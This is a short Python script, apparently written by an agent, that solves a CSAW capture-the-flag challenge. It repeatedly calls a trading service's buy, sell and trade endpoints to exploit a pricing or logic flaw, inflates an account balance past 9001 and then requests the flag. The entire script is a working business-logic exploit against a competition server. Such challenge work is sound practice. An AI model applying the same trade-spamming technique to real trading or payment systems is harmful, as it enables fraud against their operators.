import requests
import time
import random
import string

BASE = "http://android-dropper.csaw.io:4657"

def login(key):
    r = requests.post(f"{BASE}/login", data={"key": key})
    return r.json()

def buy(key, stock):
    return requests.post(f"{BASE}/buy", data={"key": key, "stock": stock}).text

def sell(key, stock):
    return requests.post(f"{BASE}/sell", data={"key": key, "stock": stock}).text

def trade(key, s1, s2):
    return requests.post(f"{BASE}/trade", data={"key": key, "stock": s1, "stock1": s2}).text

def getflag(key):
    return requests.post(f"{BASE}/flag", data={"key": key}).text

key = "".join(random.choices(string.ascii_lowercase, k=12))
print("key:", key)
print("login:", login(key))

# Buy BURPSHARKHAT (1723.44) - we have 2000
print("buy BURPSHARKHAT:", buy(key, "BURPSHARKHAT"))
time.sleep(0.5)
print("status:", login(key))

# Build requests to 11 by buy/sell GOOBER
for i in range(6):
    buy(key, "GOOBER")
    sell(key, "GOOBER")
time.sleep(0.5)
print("after build:", login(key))

# Now spam trades BURPSHARKHAT -> BROOKING, and sell BROOKING
for i in range(200):
    trade(key, "BURPSHARKHAT", "BROOKING")
    sell(key, "BROOKING")
    if i % 20 == 0:
        st = login(key)
        print(i, st)
        if st.get("balance", 0) >= 9001:
            break

st = login(key)
print("final:", st)
print("FLAG:", getflag(key))
end_of_edit

